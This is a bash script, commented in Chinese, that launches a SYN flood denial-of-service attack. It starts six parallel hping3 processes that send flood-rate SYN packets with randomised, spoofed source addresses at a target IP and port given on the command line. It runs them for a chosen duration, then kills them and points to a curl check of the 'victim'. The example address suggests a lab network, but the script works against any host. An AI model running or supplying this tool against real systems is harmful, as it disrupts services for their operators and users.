#!/bin/bash

# SYN Flood攻击脚本，使用hping3
# 用法: ./hping_attack.sh <target_ip> <target_port> [attack_duration]

if [ $# -lt 2 ]; then
    echo "Usage: $0 <target_ip> <target_port> [duration_seconds]"
    echo "Example: $0 172.20.0.20 80 60"
    exit 1
fi

TARGET_IP=$1
TARGET_PORT=$2
DURATION=${3:-60}  # 默认攻击60秒

echo "=== SYN Flood Attack ==="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Duration: $DURATION seconds"
echo "Starting attack in 3 seconds..."
sleep 3

# 启动多个hping3进程进行并发攻击
echo "Launching multiple attack processes..."

# 进程1：高速SYN flood - 最大速度
hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP &
PID1=$!

# 进程2：高速SYN flood - 最大速度
hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP &
PID2=$!

# 进程3：高速SYN flood - 最大速度
hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP &
PID3=$!

# 进程4：高速SYN flood - 最大速度
hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP &
PID4=$!

# 进程5：高速SYN flood - 最大速度
hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP &
PID5=$!

# 进程6：高速SYN flood - 最大速度
hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP &
PID6=$!

echo "Attack processes started (PIDs: $PID1 $PID2 $PID3 $PID4 $PID5 $PID6)"
echo "Attack will run for $DURATION seconds..."

# 等待指定时间
sleep $DURATION

# 停止所有攻击进程
echo "Stopping attack..."
kill $PID1 $PID2 $PID3 $PID4 $PID5 $PID6 2>/dev/null

echo "Attack completed."
echo "Check victim server response with: curl http://$TARGET_IP/"
